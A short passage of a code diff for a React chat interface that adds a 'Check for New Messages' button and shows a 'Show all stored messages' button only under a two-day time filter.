-                              Show all stored messages →
+                              <span>↻</span>
+                              <span>Check for New Messages</span>
                             </button>
-                          )}
+
+                            {selectedChatSummary.totalMessages > 0 && timeFilter === "2days" && (
+                              <button
+                                type="button"
+                                onClick={() => setTimeFilter("all")}
+                                className="text-emerald-700 font-semibold underline text-[11px] block mx-auto pt-1"
+                              >
+                                Show all stored messages →
+                              </button>
+                            )}
+                          </div>
                         </div>
                       ) : (
                         groupedMessages.map((group) => (
